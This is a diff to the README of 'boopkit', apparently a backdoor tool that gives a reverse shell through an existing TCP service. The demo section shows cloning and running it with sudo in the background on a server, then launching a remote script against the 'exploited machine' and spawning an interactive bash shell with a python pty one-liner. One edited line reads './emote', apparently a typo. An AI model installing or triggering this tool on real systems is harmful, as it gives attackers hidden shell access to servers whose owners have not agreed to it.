@@ -10,7 +10,7 @@ Seriously please use these responsibly.
 
 # Demo
 
-Install `boopkit` on a server that is already running any TCP service (EG: nginx, apache, tomcat, etc).
+Install `boopkit` on a server that is already running any TCP service (EG: Kubernetes, SSH, nginx, etc).
 
 ```
 git clone git@github.com:kris-nova/boopkit.git
@@ -22,8 +22,9 @@ sudo ./boopkit > /var/log/boop.log &
 Trigger a reverse shell over an existing TCP service. Edit the `remote` launcher script and point it at any TCP server running on the exploited machine!
 
 ```
-# edit ./remote/remote as needed
-./remote/remote
+cd remote
+# edit ./emote as needed
+./remote
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
 
